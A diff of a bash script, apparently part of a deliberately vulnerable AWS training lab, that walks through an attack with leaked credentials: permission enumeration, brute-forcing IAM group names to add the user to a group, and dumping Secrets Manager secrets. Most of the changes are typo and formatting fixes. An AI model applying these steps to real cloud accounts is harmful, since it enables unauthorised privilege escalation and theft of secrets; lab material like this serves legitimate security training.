@@ -47,12 +47,10 @@ banner() {
   printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
   printf "  • Step 1. Configuring aws credentials\n"
   printf "  • Step 2. Permission enumeration for leaked credentials\n"
-  printf "  • Step 3. Enumerating custome roles\n"
-  printf "  • Step 4. Enumerating Lambda functions\n"
-  printf "  • Step 5. Reviewing all collected info\n"
-  printf "  • Step 6. Executing privilege escalation via Lambda\n"
-  printf "  • Step 7. Cleanup\n"
-  
+  printf "  • Step 3. IAM Introspection & Escalation Discovery\n"
+  printf "  • Step 4. Group brute-force + privilege escalation attempt\n"
+  printf "  • Step 5. Dumping secrets from Secrets Manager\n"
+
 }
 banner
 
@@ -70,7 +68,7 @@ read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)...
 #############################################
 # Step 1. Configuring aws credentials
 #############################################
-printf "%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring aws credentials to use awscli  ===" "${RESET}"
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring aws credentials to use awscli  ===" "${RESET}"
 is_valid_keys() {
   local key="$1" secret="$2" token="${3:-}" region="${4:-us-east-1}"
   local rc=0 out
@@ -109,12 +107,12 @@ while :; do
     err "Not valid keys. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} failed"
   fi
 done
-
-read -r -p "Step 1 is complited. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+printf "\n"
+read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 #############################################
 # Step 2. Permission enumeration for leaked credentials
 #############################################
-printf "%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"
 
 # init colors (portable)
 
@@ -150,12 +148,13 @@ try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --pro
 try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
 try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"
 
-printf "\nOK, it seems our permissions aren't very good. Let's try to get some more info about our user...\n"
-read -r -p "Step 2 is complited. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+printf "\nOK, it seems our permissions are quite limited. Let's try to get some more info about our user...\n"
+printf "\n"
+read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 #############################################
 # Step 3. IAM Introspection & Escalation Discovery
 #############################################
-printf "%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. IAM Introspection & Escalation Discovery  ===" "${RESET}"
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. IAM Introspection & Escalation Discovery  ===" "${RESET}"
 
 PROFILE="streamgoat-scenario-4"
 
@@ -222,13 +221,13 @@ read -r -p "But we need to know group name. Lets try get the list of groups. Pre
 step "Trying to enumerate all IAM groups (should fail unless overly permissive)"
 try "IAM ListGroups" aws iam list-groups --profile "$PROFILE" --output json
 
-printf "'\nWell, this means we can not know if there is any other groups. But we may quess and try to bruteforce performing AddUserToGroup operation. If we receive an error - group doesn't exist. But if no error we have some luck.\n"
-
-read -r -p "Step 3 is complited. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+printf "\nWell, this means we can not know if there is any other groups. But we may quess and try to bruteforce performing AddUserToGroup operation. If we receive an error - group doesn't exist. But if no error we have some luck.\n"
+printf "\n"
+read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 #############################################
 # Step 4. Group brute-force + privilege escalation attempt
 #############################################
-printf "%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Group Name Brute-force & Self-Add  ===" "${RESET}"
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Group Name Brute-force & Self-Add  ===" "${RESET}"
 
 # List of guessed groups (only one is real)
 GROUP_GUESSES=(
@@ -303,12 +302,12 @@ else
   info "No managed policies attached to $TARGET_GROUP"
 fi
 
-
-read -r -p "Step 4 is complited. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+printf "\n"
+read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 #############################################
 # Step 5. Dumping secrets from Secrets Manager
 #############################################
-printf "%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. SecretsManager Dump (StreamGoat-*)  ===" "${RESET}"
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. SecretsManager Dump (StreamGoat-*)  ===" "${RESET}"
 
 step "Enumerating secrets"
 
@@ -343,3 +342,5 @@ for secret in "${SECRET_NAMES[@]}"; do
     err "Failed to dump: $secret"
   fi
 done
+printf "\n"
+read -r -p "Scenario successfully completed. Press Enter or Ctrl+C to exit" _ || true
